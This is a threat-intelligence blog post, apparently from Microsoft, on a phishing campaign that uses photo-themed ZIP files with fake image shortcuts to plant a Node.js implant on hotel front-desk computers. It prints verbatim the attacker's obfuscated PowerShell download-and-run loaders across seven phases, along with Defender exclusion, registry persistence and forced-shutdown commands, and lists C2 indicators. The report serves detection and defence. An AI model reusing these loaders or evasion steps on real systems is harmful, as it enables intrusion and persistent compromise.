---
categories:
- MS
- 보안
date: '2026-06-25T22:30:29+00:00'
description: "In this article\n\t\t\n\n\t\t\n\t\t\t\n\t\t\n\t\n\t\n\t\t\n\t\t\tAttack\
  \ chain overviewMitigation and protection guidanceReferences Learn more\t\t\n\t\n\
  \t\n\n\n\n\nMicrosoft Threat Intelligence has"
draft: false
original_url: https://www.microsoft.com/en-us/security/blog/2026/06/25/photo-zip-campaign-targeting-hospitality-industry-delivers-node-js-implant-persistent-access/
source: Microsoft Security Blog
tags:
- Phishing
title: Photo ZIP campaign targeting hospitality industry delivers Node.js implant
  for persistent access
---

In this article
		

		
			
		
	
	
		
			Attack chain overviewMitigation and protection guidanceReferences Learn more		
	
	




Microsoft Threat Intelligence has identified an active multi-stage intrusion campaign targeting organizations in the hospitality and hotel industry since April 2026. We’ve observed this activity through aggregated threat intelligence and security signals across multiple organizations in Europe and Asia. Microsoft has not attributed this campaign to a known threat actor.&nbsp;



The campaign uses photo-themed ZIP archives that the target users download through the browser. These archives contain fake image shortcut files that, when launched, start an attack chain that relies on obfuscated PowerShell, a Node.js-based implant, dual registry persistence, and command-and-control (C2) communications over non-standard ports. As of this writing, the campaign’s post-compromise activities include C2 beaconing, forced shutdowns, and compilation of portable executable (PE) payloads. While the campaign’s ultimate objective remains unclear, we assess that the threat actor’s investment in ensuring obfuscation and persistence could indicate that they’re preparing the victim devices for more follow-on activities.&nbsp;



In late May 2026, we observed the threat actor misusing legitimate services—including the cloud-based scheduling platform Calendly&#8217;s email notification infrastructure and Google&#8217;s URL redirect functionality—to deliver phishing emails with multilingual lures and subject lines (for example, guest complaints and room inquiries) designed to convince hospitality staff to open the embedded malicious link and download the ZIP archive. These phishing emails attempt to bypass conventional authentication checks through a technique we describe as authentication laundering: by routing phishing messages through a trusted service&#8217;s sending infrastructure, the threat actor can make malicious messages appear similar to legitimate notifications to email authentication defenses.&nbsp;



We’ve observed the campaign evolving in two distinct waves. The first wave (hereinafter referred to as Wave 1) used shortcut files named IMG-&lt;random numbers&gt;.png.lnk, while the second one (Wave 2) introduced a naming shift to PHOTO-&lt;random numbers&gt;.png.lnk. Wave 2 also introduced a new attack chain stage in which the PowerShell downloader triggered dynamic .NET DLL compilation through csc.exe, and the actor expanded its domain infrastructure to include .cfd domains hosted behind Cloudflare.&nbsp;



This blog summarizes the campaign’s Wave 1 and Wave 2 attack chains and provides Microsoft Defender detections and recommendations. It’s intended to share threat intelligence to help organizations better understand, identify, and defend against similar attack techniques. The activity described reflects observed patterns and behaviors and is provided to support defensive security efforts.&nbsp;



Attack chain overview


Figure 1. Assessed attack chain for the Node.js photo ZIP/LNK campaign showing both Wave 1 and Wave 2 stages.



The campaign follows a multi-stage attack chain with limited variation in overall behavior, even as the actor changed its PowerShell obfuscation and delivery refinements between waves.&nbsp;&nbsp;



Initial access and user execution&nbsp;



The campaign begins with delivery of a browser-downloaded archive with a file name that uses the pattern photo-&lt;random numbers&gt;.zip. In one observed activity, links to these archives were delivered through phishing emails. We assess that this file naming convention was designed to appear ordinary yet relevant to hospitality workflows, which commonly exchange guest photos, reservation-related images, or document snapshots.&nbsp;



In Wave 1, the archive contained a fake image shortcut named IMG-&lt;random numbers&gt;.png.lnk, which masqueraded as a PNG file while remaining executable content. In Wave 2, the threat actor introduced a naming shift to PHOTO-&lt;random numbers&gt;.png.lnk (uppercase PHOTO prefix). Successful execution depended on a target user opening what appeared to be an image.&nbsp;



The following table lists representative delivery artifacts observed across impacted environments in both campaign waves. The file sizes of the LNK files consistently fell within 1,989 to 2,079 bytes, suggesting the same builder tool.&nbsp;



LNK file&nbsp;Source archive&nbsp;Wave&nbsp;IMG-805916584.png.lnk&nbsp;C:\Users\[REDACTED]\Downloads\photo-961032103.zip&nbsp;1&nbsp;IMG-421741673.png.lnk&nbsp;C:\Users\[REDACTED]\Downloads\photo-818773648.zip&nbsp;1&nbsp;IMG-223099041.png.lnk&nbsp;C:\Users\[REDACTED]\Downloads\photo-716449357.zip&nbsp;1&nbsp;IMG-386443483.png.lnk&nbsp;Browser download&nbsp;1&nbsp;PHOTO-215746435.png.lnk&nbsp;Browser download&nbsp;2&nbsp;



Observed LNK and ZIP naming patterns across both campaigns.&nbsp;



Observed victim device naming patterns, including reception- and front office-associated systems and hotel-named devices, confirm the threat actor&#8217;s focus on staff likely to interact with image or document attachments as part of day-to-day operations. Some of the user account names observed across impacted environments include the following strings, which refer to words in different languages such as English, French, Polish, Czech, and Spanish:&nbsp;&nbsp;




reception&nbsp;





frontdesk&nbsp;





reservations&nbsp;





accueil&nbsp;&nbsp;





recepcja&nbsp;





recepce&nbsp;





frontoffice&nbsp;&nbsp;




Phishing infrastructure: Authentication laundering through legitimate services&nbsp;



Beginning late May 2026, we observed that this campaign&#8217;s initial access mechanism also abuses legitimate web services to bypass email authentication controls and obscure the true destination of phishing links. This observation aligns with the previously published findings by other security researchers.&nbsp;



The threat actor uses Calendly&#8217;s email notification system and Google&#8217;s URL redirect functionality to construct a multi-hop delivery chain in which the direct Calendly path passes Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and Domain-based Message Authentication, Reporting, and Conformance (DMARC) checks.&nbsp;


Figure 2. Phishing redirect flow.



Lure themes and language targeting&nbsp;



The sender display name across all observed emails is &#8220;Booking Manager (via Calendly),&#8221; a social engineering choice that appears designed to exploit hospitality staff&#8217;s familiarity with booking and scheduling workflows.&nbsp;



Across the relayed messages, Microsoft observed the following small set of recurring social-engineering themes delivered in Japanese, Danish, and Dutch:&nbsp;&nbsp;




Guest complaints&nbsp;





Bedbug (Cimex) infestation reports&nbsp;





Verification call notices&nbsp;





Room condition inquiries&nbsp;





Stay review requests&nbsp;




These lures are deliberately generic and non-personalized: every subject references an anonymous &#8220;guest,&#8221; &#8220;facility,&#8221; or &#8220;your accommodation,&#8221; and none contains a recipient name, guest name, or organization name. This is consistent with high-volume, list-driven distribution rather than tailored spear-phishing. The threat actor relies on urgency and reputational pressure (complaints, &#8220;final warning,&#8221; health-authority inspection, possible suspension) to drive target hospitality staff to click.&nbsp;



Language&nbsp;Canonical lure (theme)&nbsp;Japanese&nbsp;Serious guest complaint&nbsp;Japanese&nbsp;Bedbug complaint, verification call&nbsp;Japanese&nbsp;Guest stay review request&nbsp;&nbsp;Japanese&nbsp;Room condition, facility inquiry&nbsp;Japanese&nbsp;Final warning: infestation, forced inspection&nbsp;Danish&nbsp;Bedbug complaint, inspection call&nbsp;Danish&nbsp;Formal complaint, notice of suspension&nbsp;Danish&nbsp;Health-risk safety alert&nbsp;Dutch&nbsp;Complaint: possible danger, hospitalization after stay&nbsp;



Phishing lure themes by language, listed by observed prevalence.&nbsp;



The threat actor reuses the same themes across all three languages, with Japanese as the most prevalent. Notably, unfilled template placeholders—such as a literal ID token in the Danish variant—appeared in some subjects, indicating automated, templated generation.&nbsp;



Use of Calendly notification infrastructure as a phishing relay&nbsp;



The threat actor uses a threat actor-controlled Calendly account associated with the subdomain em1618.calendly.com to relay phishing emails to hospitality targets. Authentication results differ by delivery path.&nbsp;



Authentication Check&nbsp;Result&nbsp;Why&nbsp;SPF&nbsp;Pass&nbsp;Email sent from authorized service&nbsp;DKIM&nbsp;Pass&nbsp;Signed by Calendly&#8217;s SendGrid sending infrastructure&nbsp;&nbsp;DMARC&nbsp;Pass&nbsp;Alignment on calendly.com domain&nbsp;Composite authentication (CompAuth)&nbsp;Pass&nbsp;All checks align&nbsp;



Authentication results for emails sent through the direct Calendly path. The checks pass because the messages are sent through authorized Calendly-associated sending infrastructure; this does not validate the intent or safety of the message content.&nbsp;



This technique, which we describe as authentication laundering in this context, exploits the trust model of email authentication. SPF, DKIM, and DMARC verify that an email was sent from authorized infrastructure for a given domain. When the sending domain is a legitimate service and the threat actor controls the message content, these checks confirm the sender is authorized while saying nothing about the intent of the message.&nbsp;



Multi-hop redirect chain&nbsp;



Each phishing email contains a Calendly redirect URL that initiates a multi-hop chain intended to obscure the final destination from users and automated URL analysis. The embedded Calendly link routes victims through a four-hop chain before reaching the payload:&nbsp;




Step 1: calendly[.]com/url?q=hxxps://share[.]google/TOKEN → HTTP 302&nbsp;





Step 2: share[.]google/TOKEN → HTTP 302&nbsp;





Step 3: www.google[.]com/share_google?q=TOKEN → HTTP 301&nbsp;





Step 4: photo-*[.]cfd → Phishing landing page (Cloudflare challenge gate)&nbsp;




Calendly&#8217;s Link Safety Service interstitial (url?q=) was used as the first hop and Google&#8217;s share[.]google redirect as the second. The final .cfd landing pages were freshly registered (for example, photo-26654[.]cfd was 17 days old at the time of analysis), Cloudflare-fronted, and gated behind a Cloudflare Turnstile (&#8220;verify you are human&#8221;) challenge that doubles as an anti-analysis and geo-gating mechanism before serving the photo-themed ZIP.&nbsp;



Microsoft assesses that this redirect architecture serves multiple evasion purposes:&nbsp;




Fragmentation of URL reputation: No single URL in the chain is inherently malicious at the time of delivery&nbsp;





Abuse of Google&#8217;s open redirect: The share.google → NULLwww.google.com/share_google redirect leverages Google infrastructure, adding trusted reputation to the chain&nbsp;




The threat actor maintains a second delivery variant that bypasses the share.google intermediate step, linking directly from a Calendly redirect URL to the phishing domain (calendly[.]com/url?q=photo-*[.]cfd). Microsoft observed that both variants are active simultaneously, with the same Calendly user UUIDs appearing across both paths. This supports the assessment that a single operator is managing the parallel delivery mechanisms.&nbsp;



PowerShell-based first stage&nbsp;



Once the malicious shortcut is opened, the next-stage payload invokes PowerShell and launches an obfuscated BigInt decoder. Across the campaign, the PowerShell stage consistently decodes data and then downloads an additional .ps1 file. Microsoft observed a repeating pattern of BigInt decoder →&nbsp; Invoke-WebRequest → .ps1. The full obfuscation evolution across seven phases is detailed in the Obfuscation evolution section of this blog.&nbsp;



The decoded URL points to the campaign&#8217;s download domains. In the validated chain, the .ps1 file is retrieved from the photo-*.cfd landing domain&nbsp;



.NET DLL compilation (Wave 2)&nbsp;



In Wave 2, we observed a new intermediate stage between the PowerShell download and Node.js deployment. The downloaded .ps1 script triggers dynamic .NET compilation through csc.exe (the C# compiler), which in turn invokes cvtres.exe (the resource-to-object converter). This sequence produces small DLL files with random names.&nbsp;&nbsp;



Representative observed artifacts:&nbsp;



Artifact&nbsp;Details&nbsp;PowerShell script&nbsp;qFWe908J.ps1 ( Size 419 KB)&nbsp;Compiled DLL&nbsp;bjygtujc.dll Size 3,072 bytes)&nbsp;



csc.exe → cvtres.exe → &lt;random&gt;.dll (3,072 bytes)&nbsp;



Figure 2. Wave 2 .NET DLL compilation chain. The compiled DLL was created but wasn’t observed being loaded through rundll32 or regsvr32 in available telemetry. This stage might be preparatory or conditional.&nbsp;



Microsoft assesses that this stage wasn’t present in Wave 1 and represents an expansion in the attack chain.&nbsp;



Script staging and Node.js implant deployment&nbsp;



After decoding and retrieval, the downloaded PowerShell script runs from the %TEMP% folder. This staging step appears to be transitional rather than final, enabling subsequent download or launch of the campaign&#8217;s Node.js component.&nbsp;&nbsp;



We observed the next step as execution of node.exe from a user-space path. The Node runtime version observed across both waves is node-v24.13.0-win-x64 (SHA-256: d14ba95cdce1ef7dc9ad3ac74949ca5db38b27378ee30f30a23cf26f9e875a11, 89.9 MB – downloaded from the legitimate nodejs[.]org site).&nbsp;&nbsp;



Figure 3 shows representative observed command lines:&nbsp;



"node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\E2HPVoYGA77RECeb.js safedocphoto[.]info 
"node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\jVXvdhxNfcqHuSf.js recallnine[.]info 
"node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\c4yCFRzE.js kentjerk[.]info 
"node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\FfXznFDs8.js photodoc-secure[.]info 
"node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\f76qtHrP.js kelopins[.]info



Figure 3. Node.js implant execution with random JavaScript filenames and C2 domain arguments.&nbsp;



The Node.js runtime functions as the interpreter for the implant&#8217;s .js payloads. Microsoft assesses that placing the runtime in a user-writable location could help the threat actor avoid dependencies on a system-installed Node.js binary while also supporting repeated payload reuse across different filenames. Hash reuse across distinct filenames confirms reuse of the same binaries, reinforcing the assessment that the threat actor prioritizes operational repeatability.&nbsp;



The Node.js implant also establishes its own persistence by spawning PowerShell to create a detached, hidden child process:&nbsp;



powershell.exe -c "$code = \"require('child_process').spawn(process.execPath, 
  ['C:\\Users\\[REDACTED]\\AppData\\Local\\Nodejs\\.js'], 
  {detached: true, stdio: 'ignore', windowsHide: true}).unref()\"; 
  $command = ... 



Figure 4. Node.js persistence mechanism using child_process.spawn with detached and windowsHide flags.&nbsp;



Defense evasion and payload execution&nbsp;



Once the Node.js component is established, the campaign modifies Defender settings by using Add-MpPreference -ExclusionProcess for temporary-path executables. We assess that this exclusion step is intended to reduce inspection of follow-on binaries located in AppData\Local\Temp. Figure 5 shows representative observed exclusion commands:&nbsp;



powershell.exe -c "Add-MpPreference -ExclusionProcess \"C:\Users\[REDACTED]\AppData\Local\Temp\utramdJQjRMJ.exe\"" 
powershell.exe -c "Add-MpPreference -ExclusionProcess \"C:\Users\[REDACTED]\AppData\Local\Temp\YEg9nfBg3QG4.exe\"" 
powershell.exe -c "Add-MpPreference -ExclusionProcess \"C:\Users\[REDACTED]\AppData\Local\Temp\57AVjhcz6vL0c.exe\"" 
powershell.exe -c "Add-MpPreference -ExclusionProcess \"C:\Users\[REDACTED]\AppData\Local\Temp\sDNud94J7WVDN.exe\"" 



Figure 5. Defender process exclusions added for randomly named EXE files seconds before their execution.&nbsp;



These excluded random EXE files in AppData\Local\Temp are then launched, followed by helper .tmp installers or unpackers that used names matching is-*.tmp and commonly ran with /SL5 or /VERYSILENT. This combination suggests a deployment chain in which the Node.js implant stages additional binaries, then launches installer-like helpers to unpack or execute the next payload. Microsoft assesses that the .tmp convention and silent-install flags are likely chosen to minimize user awareness while also obscuring the actual payload family.&nbsp;



ProgramData relocation and persistence&nbsp;



Observed payloads are then copied into C:\ProgramData\&lt;random&gt;\&lt;payload&gt;.exe. Lowercase copies with the same hash appear under different filenames, which is consistent with repackaging or relocation for stability rather than recompilation. Figure 6 shows representative observed ProgramData paths from the campaign:&nbsp;



C:\ProgramData\FFXjwKn\fehqf5oo.exe 
C:\ProgramData\PEIEZlD\qulcp452eb9.exe 
C:\ProgramData\YXbwfua\e6kz1ruadskkk.exe 
C:\ProgramData\PsrOqKF\vl8daccehg.exe 
C:\ProgramData\riloNEK\s8bpfaee.exe 
C:\ProgramData\JMSVrLU\choffgpa.exe 



Figure 6. ProgramData relocation paths with randomized folder names and lowercase payload filenames.&nbsp;



The persistence model used in this campaign is especially notable. We observed a dual mechanism in which HKCU\RunOnce pointed to the ProgramData executable while HKCU\Run pointed to the Node.js component. Figure 7 shows a representative registry persistence command:&nbsp;



cmd /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" 
  /v "zZBPZPuA" /t REG_SZ /d "C:\ProgramData\FFXjwKn\fehqf5oo.exe" /f 



Figure 7. Registry RunOnce persistence pointing to ProgramData payload with randomized value name.&nbsp;



The RunOnce behavior is particularly unusual because the payload refreshes its own persistence after each execution, effectively creating a RunOnce loop. Microsoft assesses that this design might have been intended to complicate cleanup by repopulating an entry that defenders might otherwise treat as one-time execution.&nbsp;



Command and control&nbsp;



In later stages of the campaign, compromised systems beacons to fixed IP infrastructure over non-standard ports including:&nbsp;




8443&nbsp;





8445&nbsp;





8453&nbsp;





5555&nbsp;





56001&nbsp;





56002&nbsp;





56003&nbsp;&nbsp;




We observed the campaign expanding its C2 infrastructure between waves:&nbsp;



Wave 1 IPs:&nbsp;




178.16.54[.]27&nbsp;





95.217.97[.]121&nbsp;





193.202.84[.]32&nbsp;





178.16.55[.]179&nbsp;




The IP address 178.16.54[.]27 remains active on ports 56001/56002 across both waves.&nbsp;



We also observed numerous unique domains themed around photos, documents, visas, safes, and vaults, spanning top-level domains (TLDs) such as the following:&nbsp;




.info&nbsp;





.com&nbsp;





.pro&nbsp;





.xyz&nbsp;





.cloud&nbsp;





.icu&nbsp;





.sbs&nbsp;





.click&nbsp;





.bond&nbsp;





.cfd (Wave 2)&nbsp;




Wave 2 introduced Cloudflare-hosted .cfd domains following a photo-&lt;random numbers&gt; naming convention:&nbsp;




photo-26254[.]cfd&nbsp;





photo-26654[.]cfd&nbsp;





photo-132454[.]cfd&nbsp;





photo-8632454[.]cfd&nbsp;




The domain sec-safe-dc[.]info was observed active in both waves, further supporting the assessment of a single continuous campaign.&nbsp;



Obfuscation evolution&nbsp;



A defining characteristic of this campaign is its steady but disciplined obfuscation evolution. Microsoft observed seven PowerShell obfuscation phases over the course of the campaign, but the underlying logic remained consistent: decode embedded data through arithmetic operations, recover the next-stage content, and retrieve a PowerShell script that runs from the %TEMP% folder. This pattern suggests that the threat actor is iterating for durability against static detections rather than experimenting with entirely new tradecraft.&nbsp;


Figure 8. PowerShell obfuscation evolution across six observed phases (April&ndash;May 2026).



Phase 1: XOR bigint decoding 



Early samples rely on XOR arithmetic, using two large integers and a -bxor operation, followed by byte masking and shifting. The following is a representative observed command line:&nbsp;



powershell.exe -ep bypass -c "$k=[bigint]\"2004985473718821432817707887657617\"; 
$w=[bigint]\"278573358569528286847653191217377\";$o=$k -bxor $w; 
while($o -ne 0){$g+=[char]([int]($o -band 0xFF));$o=$o -shr 8}; 
iwr $g -OutFile $env:TEMP\eRJGv.ps1 -UseBasicParsing; 
powershell -ep bypass -File $env:TEMP\eRJGv.ps1" 



Figure 9. Phase 1 PowerShell downloader using XOR-based bigint decoding with -bxor, -band 0xFF, and -shr 8.&nbsp;



Phase 2: Subtraction replaces XOR



Microsoft then observed the threat actor swapping XOR logic for subtraction while keeping the rest of the decoder identical. This change bypasses detections anchored on -bxor:&nbsp;



powershell.exe -ep bypass -c "$i=[bigint]\"1568015162836542885394310232785365293\"; 
$y=[bigint]\"989592658109712364469795296253690811\";$r=$i - $y; 
while($r -ne 0){$m+=[char]([int]($r -band 0xFF));$r=$r -shr 8}; 
iwr $m -OutFile $env:TEMP\VJksAkfp.ps1 -UseBasicParsing; 
powershell -ep bypass -File $env:TEMP\VJksAkfp.ps1"



Figure 10. Phase 2 variant replacing -bxor with subtraction while preserving the same decoding structure.&nbsp;



Phase 3: Hexadecimal to decimal substitution



The decoder then shifts from -band 0xFF to -band 255. Although functionally equivalent (0xFF = 255), this change is consistent with a threat actor testing whether surface-level constant changes could degrade signature reliability:&nbsp;



powershell.exe -ep bypass -c "$e=[bigint]\"1080978693158786688289132234139422058835788841232\"; 
$l=[bigint]\"444996423444240363171355535687083720697400778653\";$w=$e - $l; 
while($w -ne 0){$j+=[char]([int]($w -band 255));$w=$w -shr 8}; 
iwr $j -OutFile $env:TEMP\ymqMj.ps1 -UseBasicParsing; 
powershell -ep bypass -File $env:TEMP\ymqMj.ps1" 



Figure 11. Phase 3 variant replacing 0xFF with decimal 255.&nbsp;



Phase 4: Arithmetic masking



 Masking expressions are further transformed into arithmetic forms that evaluate to the same constant. This variation prevents simple string matching on either 0xFF or 255:&nbsp;



powershell.exe -ep bypass -c "$e=[bigint]\"988466760738254167909712279829942477\"; 
$y=[bigint]\"352542850680807474382013127968401501\";$i=$e - $y; 
while($i -ne 0){$b+=[char]([int]($i -band (177+78)));$i=$i -shr 8}; 
iwr $b -OutFile $env:TEMP\23QbL.ps1 -UseBasicParsing; 
powershell -ep bypass -File $env:TEMP\23QbL.ps1"



Figure 12. Phase 4 variant hiding the byte mask behind arithmetic expressions such as (177+78).&nbsp;



Other observed arithmetic masks included -band (100+155) and -band 128+127, all resolving to 255.&nbsp;



Phase 5: Modulo and division 



Later samples replace the bit-shift model entirely, switching from -band and -shr to modulo and division operations:&nbsp;



powershell.exe -ep bypass -c "$s=[bigint]\"28248557062916408148263140002288993200489702\"; 
$o=[bigint]\"18544237761852163685406436002210545666450291\";$e=$s - $o; 
while($e -ne 0){$x+=[char]([int]($e -band (255)));$e=$e -shr 8}; 
iwr $x -OutFile $env:TEMP\PVtvOP40.ps1 -UseBasicParsing; 
powershell -ep bypass -File $env:TEMP\PVtvOP40.ps1"



Figure 13. Phase 5 transitional variant; later samples in this phase fully replaced -band/-shr with % 256 and / 256.&nbsp;



Phase 6: Syntax diversification and randomization



The threat actor adopts &#8220;num&#8221; -as [bigint] casting syntax, introduces long random variable names, and uses modulo/division for byte extraction. The combined effect makes each sample visually distinct despite identical logic:&nbsp;



powershell.exe -ep bypass -c "$zGjEc0LINYdefj=\"25908558764390958596189327204542\" -as [bigint]; 
$MyL4evU3=256; 
$GqA4xFav=\"17082531775760189576112827972435\" -as [bigint]; 
$XwcU0kg87CFgqe5=$zGjEc0LINYdefj - $GqA4xFav; 
while($XwcU0kg87CFgqe5 -ne 0){ 
  $qy8gWy4FONBaCV+=[char]([int]($XwcU0kg87CFgqe5 % $MyL4evU3)); 
  $XwcU0kg87CFgqe5=$XwcU0kg87CFgqe5 / $MyL4evU3}; 
iwr $qy8gWy4FONBaCV -OutFile $env:TEMP\.ps1 -UseBasicParsing; 
powershell -ep bypass -File $env:TEMP\.ps1"



Figure 14. Phase 6 variant using -as [bigint] syntax, long randomized variable names, and modulo/division decoding.&nbsp;



Phase 7: For-loop variant with arithmetic mask (Wave 2)



The most recent observed phase introduces a for-loop iteration model with an arithmetic mask using a variable set to 100+156 (=256) and -as [bigint] casting. This is a natural evolution of Phase 6&#8217;s syntax diversification, further altering the control flow structure while preserving the same underlying decode-and-download behavior:&nbsp;



powershell.exe -ep bypass -c "$IcZWdT=100+156; 
$=\"\" -as [bigint]; 
$=\"\" -as [bigint]; 
$=$ - $; 
for($i=0; $ -ne 0; $i++){ 
  $+=[char]([int]($ % $IcZWdT)); 
  $=[bigint]($ / $IcZWdT)}; 
iwr $ -OutFile $env:TEMP\.ps1 -UseBasicParsing; 
powershell -ep bypass -File $env:TEMP\.ps1"



Figure 15. Phase 7 variant (Wave 2) introducing a for-loop with arithmetic mask $IcZWdT=100+156 and -as [bigint] casting.&nbsp;



This seven-phase evolution demonstrates a threat actor that monitors or anticipates detection pressure. The campaign doesn’t pivot away from PowerShell or Node.js; instead, it repeatedly re-skins a working loader. For defenders, this means purely literal detections on isolated operators, constants, or variable names might age quickly, while behavior-based detections anchored on the full sequence—shortcut execution, PowerShell decode, %TEMP% staging, Node.js from user space, Defender exclusions, and ProgramData persistence—are likely to remain more resilient.&nbsp;



Campaign evolution&nbsp;



Microsoft assesses that the observable differences between Wave 1 and Wave 2 represent a deliberate operational evolution by the same threat actor. The following cross-wave correlations support this assessment:&nbsp;



Evidence of a single continuous campaign&nbsp;



Indicator&nbsp;Wave 1 (April to May 2026)&nbsp;Wave 2 (Late May to June 2026)&nbsp;Assessment&nbsp;PE payload hash (xmnrwv9l.exe)&nbsp;04ec44f2618460f5c77c5e56014a512cc03a123c9c5b6b6b1273e2a1681ac2e1&nbsp;Same hash observed&nbsp;Same payload binary&nbsp;C2 IP&nbsp;178.16.54[.]27&nbsp;Same IP, ports 56001/56002&nbsp;Same infrastructure&nbsp;Node.js version&nbsp;v24.13.0-win-x64&nbsp;v24.13.0-win-x64&nbsp;Same runtime&nbsp;Domain&nbsp;sec-safe-dc[.]info&nbsp;Active in both waves&nbsp;Shared domain&nbsp;C2 ports&nbsp;56001, 56002, 56003&nbsp;56001, 56002&nbsp;Same non-standard port pattern&nbsp;



Cross-wave artifact overlaps demonstrating a single continuous campaign.&nbsp;



What changed between waves&nbsp;



Dimension&nbsp;Wave 1 (April to May 2026)&nbsp;Wave 2 (Late May to June 2026)&nbsp;LNK naming&nbsp;IMG-&lt;random numbers&gt;.png.lnk&nbsp;PHOTO-&lt;random numbers&gt;.png.lnk&nbsp;ZIP contents&nbsp;LNK only&nbsp;LNK (PHOTO- prefix)&nbsp;Attack chain&nbsp;PowerShell → Node.js&nbsp;PowerShell → csc.exe/cvtres.exe → DLL → Node.js&nbsp;Obfuscation&nbsp;Phases 1–6&nbsp;Phase 7 (for-loop variant)&nbsp;Domain TLDs&nbsp;.info, .com, .pro, .xyz, .cloud, .icu, .sbs&nbsp;Added .cfd, .click, and .bond&nbsp;Infrastructure&nbsp;Direct hosting&nbsp;Cloudflare-fronted .cfd domains&nbsp;C2 domains&nbsp;Photo, document, and visa themes&nbsp;Added zloapobikahy23[.]bond, higoksbupwou[.]com, aluminiostramuntana[.]com&nbsp;



Summary of campaign evolution from Wave 1 to Wave 2.&nbsp;



Microsoft assesses that these changes reflect operational maturation rather than a shift in objectives. The threat actor expanded evasion (DLL compilation, Cloudflare fronting) and broadened targeting—all while maintaining the same core attack chain and reusing key infrastructure.&nbsp;



Persistence survival analysis&nbsp;



One of the significant findings from Wave 2 is the demonstrated resilience of the dual persistence model under active Defender intervention.&nbsp;



On a confirmed compromised device, Defender detected and blocked one PE payload (xmnrwv9l.exe, SHA-256: 04ec44f2618460f5c77c5e56014a512cc03a123c9c5b6b6b1273e2a1681ac2e1) with Wacatac detections. Despite that block, the Node.js HKCU\Run key persistence remained active. Approximately two days later, the Node.js implant reactivated and resumed C2 communications to new domains.&nbsp;



Following the initial block, Microsoft observed additional /VERYSILENT EXEs deployed on the same device:&nbsp;



cBA8H4S5k04jAY.exe 
eaa3q8BQZcnIOV.exe 
BaUWXagH4CGZS.exe 
CJE4domtVFM9LX.exe



Figure 18. Additional payload EXEs deployed after Defender blocked the initial PE, demonstrating the implant&#8217;s ability to retry delivery through the surviving Node.js persistence.&nbsp;



This sequence highlights a remediation consideration: the dual persistence model (RunOnce for the PE payload + Run for Node.js) means that blocking one execution path might not fully neutralize the other. The Node.js implant, if it remains active, can re-download and re-attempt payload delivery. Microsoft assesses that complete remediation of this campaign requires removal of both persistence mechanisms—the ProgramData RunOnce entry and the Node.js Run key—along with the Node.js runtime and associated .js files from the user&#8217;s AppData\Local\Nodejs\ directory.&nbsp;


Figure 16. Persistence and C2 architecture-dual registry keys, persistence survival, and post-compromise.



Post-compromise activity&nbsp;



Microsoft observed a subset of devices reaching clear late-stage post-compromise behavior. On multiple devices, the activity progressed to active C2 beaconing, browser automation with &#8211;headless &#8211;no-sandbox flags, and environment lookups. Based on the command-line pattern alone, Microsoft assesses that the threat actor likely used automated browser execution rather than manual interactive browsing on those hosts.&nbsp;



The campaign also performed an environment lookup using ip-api[.]com, observed through 208.95.112[.]1. This behavior is consistent with gathering external network context before continuing operations. Microsoft assesses that this lookup might have helped the operator understand geographic or connectivity attributes of the compromised device environment.&nbsp;



A final disruptive behavior involved forced shutdown through cmd /c shutdown -s -t 0, observed on multiple devices. Microsoft assesses that immediate shutdown could have served several purposes depending on the host context: interruption of user activity, reduction of defender response time during a specific stage, or concealment of visible symptoms after automated browser tasks or payload launches completed.&nbsp;



The persistence design itself is a meaningful post-compromise observation. The combination of a durable Node.js launch point in HKCU\Run and a repeatedly refreshed ProgramData payload through HKCU\RunOnce suggests an effort to maintain execution options across user sign-ins while also preserving a secondary recovery path. This RunOnce loop is unusual enough that it might provide defenders with a strong hunting pivot even when file names, domains, or script syntax change.&nbsp;



Mitigation and protection guidance



Organizations in hospitality and adjacent service industries should prioritize layered detections for this campaign&#8217;s behavior sequence rather than any single indicator. Microsoft recommends the following actions based on the observed attack chain:&nbsp;




Treat photo-themed ZIP archives and fake image shortcuts as high risk. Investigate browser-downloaded archives matching photo-&lt;random numbers&gt;.zip and shortcut files matching IMG-&lt;random numbers&gt;.png.lnk or PHOTO-&lt;random numbers&gt;.png.lnk, especially when they’re followed by PowerShell or script interpreter launches. Learn more about attack surface reduction rules&nbsp;





Harden and monitor PowerShell execution. Because the campaign repeatedly used obfuscated BigInt arithmetic across seven phases, defenders should prioritize PowerShell activity that includes unusual combinations of BigInt casting, subtraction or XOR decode logic, byte masking, modulo or division byte extraction, for-loop decode patterns, and subsequent Invoke-WebRequest behavior. Learn more about PowerShell constrained language&nbsp;





Monitor for unexpected .NET compilation. The appearance of csc.exe spawning cvtres.exe and producing small DLLs in user-writable paths, especially when initiated by PowerShell scripts from %TEMP%, is unusual in hospitality environments and should be investigated.&nbsp;





Investigate Node.js execution from user-space paths. node.exe running from C:\Users\&lt;user&gt;\AppData\Local\Nodejs\ with a random .js file and domain argument is unusual in many enterprise environments. Microsoft recommends reviewing whether Node.js is expected on reception, front office, or similarly targeted systems.&nbsp;





Alert on Defender exclusion changes tied to temporary executables. Add-MpPreference -ExclusionProcess aligned to %TEMP% or AppData\Local\Temp should be treated as suspicious when associated with shortcut-driven or script-driven execution chains. Learn more about tamper protection&nbsp;.





Hunt for random EXE launches from temporary paths and helper .tmp installers. The campaign uses numerous unique temporary executable filenames and helper is-*.tmp files with /SL5 or /VERYSILENT. These patterns are likely more durable than individual filenames.&nbsp;





Review persistence in both HKCU\Run and HKCU\RunOnce. Pay particular attention to values that launch node.exe from user directories or reference executables under C:\ProgramData\&lt;random&gt;\. Because the campaign refreshes RunOnce, repeated recreation of that value might be a strong signal. Critically, both keys must be removed during remediation—removing only the RunOnce entry leaves the Node.js implant active.&nbsp;





Monitor network connections on the observed non-standard ports. Outbound traffic to 8443, 8445, 8453, 5555, 56001, 56002, and 56003, especially when initiated by node.exe or executables from user profile and temporary paths, should be reviewed promptly.&nbsp;





Block or alert on .cfd domains matching the campaign pattern. Wave 2 domains follow a photo-&lt;digits&gt;[.]cfd naming convention. Organizations should consider blocking these patterns and monitoring for DNS queries to recently registered .cfd domains.&nbsp;





Investigate browser automation and forced shutdown patterns. The combination of &#8211;headless &#8211;no-sandbox and cmd /c shutdown -s -t 0 might indicate late-stage execution on selected hosts.&nbsp;





Use sector-aware hunting. Because Microsoft observed concentration in hospitality and hotel environments across multiple countries, organizations should review devices associated with front desk, reservation, reception, and guest-facing workflows first.&nbsp;




Microsoft Defender XDR detections&nbsp;



